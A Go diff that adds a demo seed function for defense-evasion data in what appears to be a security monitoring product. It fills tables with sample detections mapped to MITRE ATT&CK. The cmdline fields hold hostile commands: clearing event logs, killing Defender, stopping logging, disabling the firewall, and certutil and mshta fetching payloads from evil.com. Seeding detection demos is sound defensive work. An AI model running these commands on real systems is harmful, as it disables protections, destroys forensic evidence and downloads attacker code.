@@ -172,6 +172,8 @@ func main() {
 	seedOTICSSecurity(db)
 	log.Println("Seeding process injection…")
 	seedProcessInjection(db)
+	log.Println("Seeding defense evasion…")
+	seedDefenseEvasion(db)
 	log.Println("Demo seed complete.")
 }
 
@@ -3991,6 +3993,135 @@ func seedProcessInjection(db *sql.DB) {
 	db.Exec(`INSERT INTO iocs (tenant_id, indicator, type, severity, description, enabled, source, hit_count)
 		VALUES (9999,'c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4','sha256','critical','Known Cobalt Strike beacon loader hash',true,'manual',4)
 		ON CONFLICT (indicator, type) DO NOTHING`)
+}
+
+func seedDefenseEvasion(db *sql.DB) {
+	mustExec(db, `CREATE TABLE IF NOT EXISTS de_events (
+		id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
+		hostname TEXT DEFAULT '', category TEXT DEFAULT '',
+		technique TEXT DEFAULT '', mitre_id TEXT DEFAULT '',
+		severity TEXT DEFAULT 'high', status TEXT DEFAULT 'open',
+		description TEXT DEFAULT '', process_name TEXT DEFAULT '',
+		cmdline TEXT DEFAULT '', user_name TEXT DEFAULT '',
+		created_at TIMESTAMPTZ DEFAULT NOW())`)
+	mustExec(db, `CREATE TABLE IF NOT EXISTS de_controls (
+		id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
+		hostname TEXT DEFAULT '', control_name TEXT DEFAULT '',
+		control_type TEXT DEFAULT '', status TEXT DEFAULT 'active',
+		last_check TIMESTAMPTZ DEFAULT NOW(), version TEXT DEFAULT '',
+		tampered BOOLEAN DEFAULT false, created_at TIMESTAMPTZ DEFAULT NOW())`)
+	mustExec(db, `CREATE TABLE IF NOT EXISTS de_tamper (
+		id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
+		hostname TEXT DEFAULT '', target TEXT DEFAULT '',
+		action TEXT DEFAULT '', actor_pid INTEGER DEFAULT 0,
+		actor_name TEXT DEFAULT '', severity TEXT DEFAULT 'critical',
+		mitre_id TEXT DEFAULT 'T1562', status TEXT DEFAULT 'open',
+		created_at TIMESTAMPTZ DEFAULT NOW())`)
+	mustExec(db, `CREATE TABLE IF NOT EXISTS de_correlations (
+		id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
+		incident_id TEXT DEFAULT '', title TEXT DEFAULT '',
+		techniques TEXT DEFAULT '', event_ids TEXT DEFAULT '',
+		severity TEXT DEFAULT 'critical', status TEXT DEFAULT 'open',
+		hostname TEXT DEFAULT '', created_at TIMESTAMPTZ DEFAULT NOW())`)
+
+	var existing int
+	db.QueryRow(`SELECT COUNT(*) FROM de_events WHERE tenant_id=9999`).Scan(&existing)
+	if existing > 0 {
+		return
+	}
+
+	now := time.Now()
+	const realAgentHost = "win-workstation-05"
+
+	events := []struct {
+		hostname, category, technique, mitreID, severity, desc, process, cmdline, user string
+		hoursAgo                                                                       int
+	}{
+		{realAgentHost, "log_evasion", "Clear Windows Event Logs", "T1070.001", "critical", "Event log cleared via wevtutil — indicator of anti-forensics.", "wevtutil.exe", "wevtutil.exe cl System", "SYSTEM", 1},
+		{realAgentHost, "log_evasion", "Clear Command History", "T1070.003", "high", "PowerShell command history file deleted.", "powershell.exe", "Remove-Item (Get-PSReadlineOption).HistorySavePath", "CORP\\jsmith", 5},
+		{realAgentHost, "script_evasion", "Command Obfuscation", "T1027.010", "critical", "Base64-encoded PowerShell command with AMSI bypass pattern.", "powershell.exe", "powershell -nop -enc SQBFAF...", "CORP\\jsmith", 2},
+		{realAgentHost, "process_evasion", "Rename System Utilities", "T1036.003", "high", "certutil.exe renamed to update.exe before execution.", "update.exe", "update.exe -urlcache -split -f http://evil.com/p.exe", "CORP\\jsmith", 8},
+		{realAgentHost, "process_evasion", "DLL Injection", "T1055.001", "critical", "Suspicious WriteProcessMemory call from powershell.exe into explorer.exe.", "powershell.exe", "", "CORP\\jsmith", 3},
+		{"dc-01", "credential_bypass", "Process Hollowing", "T1055.012", "critical", "svchost.exe primary image section unmapped and remapped.", "powershell.exe", "", "SYSTEM", 20},
+		{"dc-01", "credential_bypass", "Disable or Modify Tools", "T1562.001", "critical", "Attempt to kill Windows Defender service process.", "cmd.exe", "taskkill /F /IM MsMpEng.exe", "SYSTEM", 30},
+		{"dc-01", "credential_bypass", "Disable Windows Event Logging", "T1562.002", "critical", "Event Log service stopped via sc.exe.", "sc.exe", "sc.exe stop eventlog", "SYSTEM", 45},
+		{"ws-fin-014", "network_evasion", "Disable or Modify System Firewall", "T1562.004", "high", "Windows Firewall disabled for all profiles.", "netsh.exe", "netsh advfirewall set allprofiles state off", "CORP\\bwagner", 60},
+		{"ws-fin-014", "script_evasion", "Mshta", "T1218.005", "high", "mshta.exe invoked with a remote HTA payload URL.", "mshta.exe", "mshta.exe http://evil.com/payload.hta", "CORP\\bwagner", 90},
+		{"ws-dev-03", "script_evasion", "Rundll32", "T1218.011", "high", "rundll32.exe invoked via javascript: mshtml RunHTMLApplication technique.", "rundll32.exe", "rundll32.exe javascript:\"..mshtml,RunHTMLApplication \"", "CORP\\devuser", 100},
+		{realAgentHost, "process_evasion", "Command Obfuscation", "T1027.010", "high", "Encoded PowerShell command observed a second time from the same host.", "powershell.exe", "powershell -enc U3RhcnQtUHJvY2Vzcw==", "CORP\\jsmith", 150},
+		{"dc-01", "credential_bypass", "Disable or Modify Tools", "T1562.001", "critical", "Second Defender-kill attempt on the same domain controller.", "taskkill.exe", "taskkill /F /IM MsMpEng.exe", "SYSTEM", 200},
+		{"ws-dev-03", "log_evasion", "Clear Windows Event Logs", "T1070.001", "medium", "Security event log cleared shortly after a failed logon spike.", "wevtutil.exe", "wevtutil.exe cl Security", "CORP\\devuser", 250},
+	}
+	for _, e := range events {
+		db.Exec(`
+			INSERT INTO de_events (tenant_id, hostname, category, technique, mitre_id, severity, status, description, process_name, cmdline, user_name, created_at)
+			VALUES (9999,$1,$2,$3,$4,$5,'open',$6,$7,$8,$9,$10)`,
+			e.hostname, e.category, e.technique, e.mitreID, e.severity, e.desc, e.process, e.cmdline, e.user,
+			now.Add(-time.Duration(e.hoursAgo)*time.Hour),
+		)
+	}
+
+	controls := []struct {
+		hostname, name, ctype, status, version string
+		tampered                               bool
+		daysAgo                                int
+	}{
+		{realAgentHost, "Windows Defender", "antivirus", "degraded", "4.18.24010.7", true, 0},
+		{realAgentHost, "EDR Agent", "edr", "active", "7.2.1", false, 0},
+		{realAgentHost, "Sysmon", "logging", "active", "15.15", false, 0},
+		{realAgentHost, "Audit Logging", "logging", "degraded", "", true, 1},
+		{"dc-01", "Windows Defender", "antivirus", "disabled", "4.18.23110.3", true, 1},
+		{"dc-01", "Firewall", "firewall", "active", "", false, 0},
+		{"ws-fin-014", "Firewall", "firewall", "disabled", "", true, 3},
+		{"ws-fin-014", "EDR Agent", "edr", "active", "7.2.1", false, 0},
+		{"ws-dev-03", "Windows Defender", "antivirus", "active", "4.18.24010.7", false, 0},
+		{"ws-dev-03", "Sysmon", "logging", "active", "15.15", false, 0},
+	}
+	for _, ctrl := range controls {
+		db.Exec(`
+			INSERT INTO de_controls (tenant_id, hostname, control_name, control_type, status, last_check, version, tampered, created_at)
+			VALUES (9999,$1,$2,$3,$4,$5,$6,$7,$8)`,
+			ctrl.hostname, ctrl.name, ctrl.ctype, ctrl.status, now.Add(-time.Duration(ctrl.daysAgo)*24*time.Hour), ctrl.version, ctrl.tampered,
+			now.Add(-time.Duration(ctrl.daysAgo+10)*24*time.Hour),
+		)
+	}
+
+	tamper := []struct {
+		hostname, target, action, actorName, severity, mitreID string
+		actorPID                                               int
+		hoursAgo                                               int
+	}{
+		{realAgentHost, "Windows Defender", "disable_realtime_protection", "powershell.exe", "critical", "T1562.001", 7142, 0},
+		{realAgentHost, "Audit Logging", "clear_event_log", "wevtutil.exe", "critical", "T1070.001", 9200, 1},
+		{"dc-01", "Windows Defender", "kill_process", "cmd.exe", "critical", "T1562.001", 5501, 30},
+		{"dc-01", "Windows Event Log", "stop_service", "sc.exe", "critical", "T1562.002", 5502, 45},
+		{"ws-fin-014", "Windows Firewall", "disable_firewall", "netsh.exe", "high", "T1562.004", 6001, 60},
+	}
+	for _, t := range tamper {
+		db.Exec(`
+			INSERT INTO de_tamper (tenant_id, hostname, target, action, actor_pid, actor_name, severity, mitre_id, status, created_at)
+			VALUES (9999,$1,$2,$3,$4,$5,$6,$7,'open',$8)`,
+			t.hostname, t.target, t.action, t.actorPID, t.actorName, t.severity, t.mitreID,
+			now.Add(-time.Duration(t.hoursAgo)*time.Hour),
+		)
+	}
+
+	correlations := []struct {
+		incidentID, title, techniques, hostname, severity string
+		hoursAgo                                          int
+	}{
+		{"DE-2026-001", "Multi-stage Defender disable + log clearing on DC-01", "T1562.001, T1562.002, T1070.001", "dc-01", "critical", 30},
+		{"DE-2026-002", "PowerShell obfuscation chain with DLL injection", "T1027.010, T1055.001", realAgentHost, "critical", 2},
+		{"DE-2026-003", "LOLBin abuse via mshta and rundll32", "T1218.005, T1218.011", "ws-fin-014", "high", 90},
+	}
+	for _, corr := range correlations {
+		db.Exec(`
+			INSERT INTO de_correlations (tenant_id, incident_id, title, techniques, severity, status, hostname, created_at)
+			VALUES (9999,$1,$2,$3,$4,'open',$5,$6)`,
+			corr.incidentID, corr.title, corr.techniques, corr.severity, corr.hostname,
+			now.Add(-time.Duration(corr.hoursAgo)*time.Hour),
+		)
+	}
 }
 
 func seedFirewallEnterprise(db *sql.DB) {
